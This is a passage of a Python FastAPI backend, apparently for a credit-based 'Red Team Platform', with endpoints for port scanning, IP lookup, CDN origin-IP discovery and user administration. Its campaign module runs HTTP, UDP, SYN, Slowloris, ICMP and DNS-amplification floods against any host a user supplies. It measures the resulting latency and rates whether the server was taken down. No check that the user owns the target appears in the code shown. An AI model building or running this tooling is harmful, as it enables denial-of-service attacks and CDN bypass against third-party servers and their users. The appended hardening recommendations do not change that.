            "host": result.get("host"),
            "ips": result.get("ips", []),
            "erro": result.get("erro"),
        }
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/recon/scan")
async def scan_ports(req: ReconScanRequest, current_user: User = Depends(get_current_user)):
    try:
        portas = parse_portas(req.ports)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    _cleanup_old_scan_tasks()

    task_id = f"scan_{int(time.time()*1000)}_{os.urandom(4).hex()}"
    q: _queue.Queue = _queue.Queue()
    _scan_tasks[task_id] = {"q": q, "done": False, "results": None, "error": None, "completed_at": 0.0}

    def _run():
        try:
            def progress_cb(done, total):
                q.put({"progress": done, "total": total})
            results = scan_portas(req.host, portas, timeout=req.timeout, workers=req.workers,
                                  progress_cb=progress_cb)
            _scan_tasks[task_id]["results"] = results
            q.put({"done": True, "results": results, "host": req.host})
        except Exception as e:
            _scan_tasks[task_id]["error"] = str(e)
            q.put({"done": True, "error": str(e), "results": []})
        finally:
            _scan_tasks[task_id]["done"] = True
            _scan_tasks[task_id]["completed_at"] = time.time()
            _operation_logs.append({"module": "Recon", "action": "Port scan",
                                     "details": f"{req.host} ({req.ports})",
                                     "timestamp": datetime.utcnow().isoformat()})

    threading.Thread(target=_run, daemon=True).start()
    return {"task_id": task_id, "total": len(portas)}


@app.get("/api/recon/scan/stream/{task_id}")
async def scan_stream(task_id: str, current_user: User = Depends(get_current_user)):
    if task_id not in _scan_tasks:
        raise HTTPException(status_code=404, detail="Task não encontrada")

    task = _scan_tasks[task_id]
    q: _queue.Queue = task["q"]

    async def _generate():
        import time as _time
        deadline = _time.monotonic() + 3600  # hard limit: 1h
        while _time.monotonic() < deadline:
            try:
                msg = q.get_nowait()
            except _queue.Empty:
                if task.get("done"):  # task concluída + fila vazia → encerra
                    break
                await asyncio.sleep(0.15)
                continue
            yield f"data: {json.dumps(msg)}\n\n"
            if msg.get("done"):
                break

    return StreamingResponse(
        _generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
        },
    )


@app.post("/api/recon/ipinfo")
async def ip_info(req: ReconIPInfoRequest, current_user: User = Depends(get_current_user)):
    def _fetch():
        r = _requests.get(
            f"http://ip-api.com/json/{req.ip}",
            params={"fields": "status,message,country,countryCode,regionName,city,isp,org,as,lat,lon,query"},
            timeout=10,
        )
        r.raise_for_status()
        return r.json()
    try:
        data = await asyncio.get_event_loop().run_in_executor(None, _fetch)
    except Exception as e:
        raise HTTPException(status_code=502, detail=f"Erro ao consultar IP: {e}")
    if data.get("status") != "success":
        raise HTTPException(status_code=404, detail=data.get("message", "IP não encontrado ou inválido"))
    _operation_logs.append({"module": "Recon", "action": "IP Info", "details": req.ip, "timestamp": datetime.utcnow().isoformat()})
    return data


@app.post("/api/recon/cdn-check")
async def cdn_check(req: CDNCheckRequest, current_user: User = Depends(get_current_user)):
    """Detecta CDN e tenta descobrir o IP real de origem do servidor."""
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    _operation_logs.append({
        "module": "Recon", "action": "CDN Check",
        "details": domain, "timestamp": datetime.utcnow().isoformat(),
    })
    try:
        result = await asyncio.to_thread(find_origin_ip, domain)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erro na análise CDN: {e}")
    return result


@app.post("/api/recon/cloudfail")
async def start_cloudfail(req: CloudFailRequest, current_user: User = Depends(get_current_user)):
    _cf.cleanup_old_jobs()
    domain = req.domain.strip().lower().removeprefix("http://").removeprefix("https://").split("/")[0].split("?")[0]
    # strip www. para escanear o domínio raiz (www.exemplo.com → exemplo.com)
    if domain.startswith("www."):
        domain = domain[4:]
    if not domain or "." not in domain:
        raise HTTPException(status_code=400, detail="Domínio inválido")
    job_id = f"cf_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
    wordlist = _cf.WORDLIST
    _cf.start_job(job_id, domain, wordlist, workers=min(req.workers, 50))
    _operation_logs.append({"module": "Recon", "action": "CloudFail", "details": domain, "timestamp": datetime.utcnow().isoformat()})
    return {"job_id": job_id, "domain": domain, "total": len(wordlist)}


@app.get("/api/recon/cloudfail/{job_id}")
async def get_cloudfail_status(job_id: str, current_user: User = Depends(get_current_user)):
    job = _cf.get_job(job_id)
    if not job:
        raise HTTPException(status_code=404, detail="Job não encontrado")
    exposed = [f for f in job["found"] if f["exposed"]]
    return {
        "job_id": job_id,
        "status": job["status"],
        "domain": job["domain"],
        "domain_info": job["domain_info"],
        "progress": job["progress"],
        "total": job["total"],
        "found_count": len(exposed),
        "found": exposed,
        "all_found": job["found"],
        "error": job["error"],
    }


# ── Admin ────────────────────────────────────────────────────────────────────

@app.get("/api/admin/stats")
async def admin_stats(admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    total_users = db.query(func.count(User.id)).scalar() or 0
    active_users = db.query(func.count(User.id)).filter(User.status == "active").scalar() or 0
    total_credits = db.query(func.sum(User.credits)).scalar() or 0
    first_of_month = datetime.utcnow().replace(day=1, hour=0, minute=0, second=0, microsecond=0)
    new_this_month = db.query(func.count(User.id)).filter(User.created_at >= first_of_month).scalar() or 0
    return {
        "total_users": total_users,
        "active_users": active_users,
        "total_credits": int(total_credits),
        "new_this_month": new_this_month,
    }

@app.get("/api/admin/users")
async def admin_list_users(admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    users = db.query(User).order_by(User.created_at.desc()).all()
    return {"users": [
        {
            "id": u.id,
            "username": u.username,
            "email": u.email,
            "is_admin": u.is_admin or False,
            "credits": u.credits or 0,
            "status": u.status or "active",
            "created_at": u.created_at.isoformat(),
        }
        for u in users
    ]}

@app.post("/api/admin/users")
async def admin_create_user(req: AdminCreateUserRequest, admin: User = Depends(require_admin), db: Session = Depends(get_db)):
    if db.query(User).filter(User.username == req.username).first():
        raise HTTPException(status_code=400, detail="Username já existe")
    if db.query(User).filter(User.email == req.email).first():
        raise HTTPException(status_code=400, detail="Email já existe")
    user = User(
        username=req.username,
        email=req.email,
        password_hash=hash_password(req.password),
        is_admin=req.is_admin,
        credits=req.credits,
        status="active",
    )
    db.add(user)
    db.commit()
    db.refresh(user)
    _operation_logs.append({"module": "ADMIN", "action": "Usuário criado", "details": req.username, "timestamp": datetime.utcnow().isoformat()})
    return {"id": user.id, "message": "Usuário criado com sucesso"}

@app.put("/api/admin/users/{user_id}")
async def admin_update_user(
    user_id: str, req: AdminUpdateUserRequest,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    if req.username is not None:
        existing = db.query(User).filter(User.username == req.username, User.id != user_id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Username já está em uso")
        user.username = req.username
    if req.email is not None:
        existing = db.query(User).filter(User.email == req.email, User.id != user_id).first()
        if existing:
            raise HTTPException(status_code=400, detail="Email já está em uso")
        user.email = req.email
    if req.password:
        user.password_hash = hash_password(req.password)
    if req.is_admin is not None:
        user.is_admin = req.is_admin
    if req.status is not None:
        user.status = req.status
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": "Usuário atualizado", "details": user.username, "timestamp": datetime.utcnow().isoformat()})
    return {"message": "Usuário atualizado com sucesso"}

@app.post("/api/admin/users/{user_id}/credits")
async def admin_update_credits(
    user_id: str, req: AdminCreditsRequest,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    current = user.credits or 0
    if req.action == "add":
        user.credits = current + req.amount
    elif req.action == "remove":
        user.credits = max(0, current - req.amount)
    elif req.action == "set":
        user.credits = max(0, req.amount)
    else:
        raise HTTPException(status_code=400, detail="Ação inválida. Use: add, remove, set")
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": f"Créditos {req.action}", "details": f"{user.username}: {user.credits}", "timestamp": datetime.utcnow().isoformat()})
    return {"message": "Créditos atualizados", "credits": user.credits}

@app.delete("/api/admin/users/{user_id}")
async def admin_delete_user(
    user_id: str,
    admin: User = Depends(require_admin), db: Session = Depends(get_db)
):
    if user_id == admin.id:
        raise HTTPException(status_code=400, detail="Nao e possivel deletar o proprio usuario")
    user = db.query(User).filter(User.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    username = user.username
    db.delete(user)
    db.commit()
    _operation_logs.append({"module": "ADMIN", "action": "Usuário deletado", "details": username, "timestamp": datetime.utcnow().isoformat()})
    return {"message": f"Usuário '{username}' deletado"}


# ── Campaign (módulo de automação completa) ───────────────────────────────────

class CampaignRequest(BaseModel):
    target_host: str
    target_port: int = 80
    methods: List[str] = ["http_flood", "slowloris", "udp_flood"]
    duration_per_method: int = 30
    threads: int = 8
    pps: int = 200
    run_recon: bool = True

_campaign_store: dict = {}  # campaign_id -> campaign state dict

def _probe_latency(host: str, port: int, timeout: float = 4.0) -> dict:
    """Faz uma requisição HTTP simples e retorna latência e status."""
    t0 = time.time()
    try:
        r = _requests.get(f"http://{host}:{port}/", timeout=timeout, allow_redirects=False)
        return {"ms": int((time.time() - t0) * 1000), "code": r.status_code, "ok": True}
    except _requests.exceptions.Timeout:
        return {"ms": int(timeout * 1000), "code": 0, "ok": False, "reason": "timeout"}
    except Exception as e:
        return {"ms": int((time.time() - t0) * 1000), "code": 0, "ok": False, "reason": str(e)[:60]}

def _effectiveness_label(score: int) -> str:
    if score >= 80: return "Servidor derrubado"
    if score >= 50: return "Servico degradado"
    if score >= 25: return "Impacto moderado"
    return "Servidor resistiu"

def _recommendations(results: list, recon: dict) -> list:
    recs = []
    for r in results:
        m = r["method"]
        eff = r["effectiveness"]
        if m == "slowloris" and eff >= 50:
            recs.append("Implante limite de conexoes simultaneas por IP (ex: nginx limit_conn). O Slowloris explorou conexoes abertas sem rate limit.")
        if m == "http_flood" and eff >= 50:
            recs.append("Ative rate limiting por IP (ex: nginx limit_req 20r/s). O HTTP Flood saturou o servidor sem restricao de requisicoes.")
        if m == "udp_flood" and eff >= 25:
            recs.append("Configure firewall para bloquear UDP flood no perimetro (iptables -A INPUT -p udp --dport X -m limit --limit 100/s -j ACCEPT).")
        if m == "syn_flood" and eff >= 25:
            recs.append("Habilite SYN Cookies no kernel (net.ipv4.tcp_syncookies=1) para mitigar SYN Flood sem descartar conexoes legitimas.")
        if m == "dns_amplification" and eff >= 25:
            recs.append("Desative recursao aberta no servidor DNS e utilize Response Rate Limiting (DNS RRL) para mitigar amplificacao.")
    if not recs:
        recs.append("Servidor demonstrou boa resiliencia. Continue monitorando com ferramentas de observabilidade (Grafana, Prometheus).")
    server = recon.get("server_header", "")
    if server and "Apache" in server:
        recs.append("Servidor Apache detectado: ative mod_reqtimeout e mod_evasive para mitigar Slowloris e HTTP Flood nativamente.")
    if server and "nginx" in server.lower():
        recs.append("Servidor nginx detectado: use worker_processes auto e ajuste worker_connections para melhor distribuicao de carga sob ataque.")
    return recs

def _run_campaign(campaign_id: str, req: CampaignRequest):
    state = _campaign_store[campaign_id]
    state["status"] = "running"
    results = []

    try:
        # ── Fase 0: Recon ────────────────────────────────────────────────────
        recon_data = {"host": req.target_host, "port": req.target_port}
        if req.run_recon:
            state["phase"] = "recon"
            state["phase_label"] = "Reconhecimento do alvo"
            try:
                resolved = _socket.gethostbyname(req.target_host)
                recon_data["resolved_ip"] = resolved
            except Exception:
                recon_data["resolved_ip"] = req.target_host

            # Baseline latência
            probes = [_probe_latency(req.target_host, req.target_port) for _ in range(3)]
            ok_probes = [p for p in probes if p["ok"]]
            baseline = int(sum(p["ms"] for p in ok_probes) / len(ok_probes)) if ok_probes else 9999

            # Headers HTTP
            try:
                resp = _requests.get(f"http://{req.target_host}:{req.target_port}/", timeout=5, allow_redirects=False)
                recon_data["server_header"] = resp.headers.get("Server", "n/d")
                recon_data["status_code"] = resp.status_code
                csp = resp.headers.get("Content-Security-Policy", "")
                recon_data["has_csp"] = bool(csp)
                recon_data["has_hsts"] = bool(resp.headers.get("Strict-Transport-Security", ""))
                recon_data["has_ratelimit"] = bool(resp.headers.get("X-RateLimit-Limit") or resp.headers.get("Retry-After"))
            except Exception:
                recon_data["server_header"] = "n/d"

            recon_data["baseline_ms"] = baseline
            state["recon"] = recon_data

        else:
            # Sem recon, mede baseline rapidamente
            probes = [_probe_latency(req.target_host, req.target_port) for _ in range(2)]
            ok_probes = [p for p in probes if p["ok"]]
            baseline = int(sum(p["ms"] for p in ok_probes) / len(ok_probes)) if ok_probes else 9999
            recon_data["baseline_ms"] = baseline
            state["recon"] = recon_data

        # ── Fases de ataque ──────────────────────────────────────────────────
        for idx, method in enumerate(req.methods):
            state["phase"] = f"attack_{idx}"
            state["phase_label"] = f"Executando {method.replace('_', ' ').title()} ({idx+1}/{len(req.methods)})"
            state["current_method"] = method

            executor = LocalFloodExecutor()
            thread, result_ref = executor.start_test(
                target_host=req.target_host,
                target_port=req.target_port,
                method=method,
                duration=req.duration_per_method,
                pps=req.pps,
                threads=req.threads,
            )

            # Sonda latência a cada 2s durante o ataque
            probes_during = []
            elapsed = 0
            while elapsed < req.duration_per_method:
                time.sleep(2)
                elapsed += 2
                p = _probe_latency(req.target_host, req.target_port, timeout=5.0)
                p["elapsed"] = elapsed
                probes_during.append(p)
                state["live_probe"] = p

            thread.join(timeout=5)  # aguarda thread finalizar
            final_metrics = result_ref

            # Calcula efetividade
            failed   = [p for p in probes_during if not p["ok"] or p["code"] in (429, 503, 504)]
            ok_d     = [p for p in probes_during if p["ok"] and p["code"] not in (429, 503, 504)]
            avg_lat  = int(sum(p["ms"] for p in ok_d) / len(ok_d)) if ok_d else int(req.duration_per_method * 1000)
            peak_lat = max((p["ms"] for p in probes_during), default=0)
            latency_inc = ((avg_lat - baseline) / max(baseline, 1)) * 100 if baseline < 9000 else 0
            fail_pct    = (len(failed) / max(len(probes_during), 1)) * 100
            effectiveness = min(100, int(fail_pct * 0.6 + min(latency_inc, 100) * 0.4))

            result = {
                "method":          method,
                "method_label":    method.replace("_", " ").title(),
                "requests_sent":   final_metrics.get("requests") or final_metrics.get("packets") or 0,
                "errors":          final_metrics.get("errors", 0),
                "baseline_ms":     recon_data["baseline_ms"],
                "avg_latency_ms":  avg_lat,
                "peak_latency_ms": peak_lat,
                "fail_pct":        round(fail_pct, 1),
                "latency_inc_pct": round(latency_inc, 1),
                "effectiveness":   effectiveness,
                "verdict":         _effectiveness_label(effectiveness),
                "probes":          len(probes_during),
            }
            results.append(result)
            state["results"] = results[:]

        # ── Fase final: relatório ─────────────────────────────────────────────
        state["phase"] = "report"
        state["phase_label"] = "Gerando relatorio"
        best = max(results, key=lambda r: r["effectiveness"]) if results else None
        state["report"] = {
            "target":          f"{req.target_host}:{req.target_port}",
            "total_methods":   len(results),
            "total_duration":  len(results) * req.duration_per_method,
            "recon":           state.get("recon", {}),
            "results":         results,
            "best_method":     best["method"] if best else None,
            "best_label":      best["method_label"] if best else None,
            "best_eff":        best["effectiveness"] if best else 0,
            "recommendations": _recommendations(results, state.get("recon", {})),
            "finished_at":     datetime.utcnow().isoformat(),
        }
        state["status"] = "done"
        state["phase_label"] = "Campanha concluida"

    except Exception as e:
        state["status"] = "error"
        state["error"] = str(e)

    _operation_logs.append({
        "module": "Campaign",
        "action": "Campanha automatica",
        "details": f"{req.target_host}:{req.target_port} — {len(req.methods)} metodos",
        "timestamp": datetime.utcnow().isoformat(),
    })

@app.post("/api/campaign/start")
async def campaign_start(req: CampaignRequest, current_user: User = Depends(get_current_user)):
    valid_methods = {"http_flood", "slowloris", "udp_flood", "syn_flood", "dns_amplification", "icmp_flood"}
    bad = [m for m in req.methods if m not in valid_methods]
    if bad:
        raise HTTPException(status_code=400, detail=f"Metodos invalidos: {bad}")
    if not req.methods:
        raise HTTPException(status_code=400, detail="Selecione ao menos um metodo")
    if req.duration_per_method < 10 or req.duration_per_method > 120:
        raise HTTPException(status_code=400, detail="Duracao por metodo: 10-120s")

    try:
        resolved = await asyncio.to_thread(_socket.gethostbyname, req.target_host)
    except _socket.gaierror:
        raise HTTPException(status_code=400, detail=f"Host nao encontrado: {req.target_host}")

    campaign_id = f"camp_{int(time.time() * 1000)}_{os.urandom(3).hex()}"
    _campaign_store[campaign_id] = {
        "id":          campaign_id,
        "status":      "starting",
        "phase":       "init",
        "phase_label": "Iniciando campanha",
        "target":      f"{req.target_host}:{req.target_port}",
        "methods":     req.methods,
        "results":     [],
        "recon":       {},
        "report":      None,
        "live_probe":  None,
        "started_at":  datetime.utcnow().isoformat(),
    }

    threading.Thread(target=_run_campaign, args=(campaign_id, req), daemon=True).start()
    return {"campaign_id": campaign_id, "status": "starting", "methods": req.methods}

@app.get("/api/campaign/status/{campaign_id}")
async def campaign_status(campaign_id: str, current_user: User = Depends(get_current_user)):
    c = _campaign_store.get(campaign_id)
    if not c:
        raise HTTPException(status_code=404, detail="Campanha nao encontrada")
    return c

@app.get("/api/campaign/list")
async def campaign_list(current_user: User = Depends(get_current_user)):
    return {"campaigns": [
        {"id": v["id"], "target": v["target"], "status": v["status"],
         "started_at": v["started_at"], "methods": v["methods"]}
        for v in _campaign_store.values()
    ]}

@app.delete("/api/campaign/{campaign_id}")
async def campaign_delete(campaign_id: str, current_user: User = Depends(get_current_user)):
    if campaign_id not in _campaign_store:
        raise HTTPException(status_code=404, detail="Campanha nao encontrada")
    del _campaign_store[campaign_id]
    return {"message": "Campanha removida"}


# ── Root ─────────────────────────────────────────────────────────────────────

@app.get("/")
async def root():
    return {"message": "PenteIA v4.0 - Red Team Platform", "docs": "/docs"}
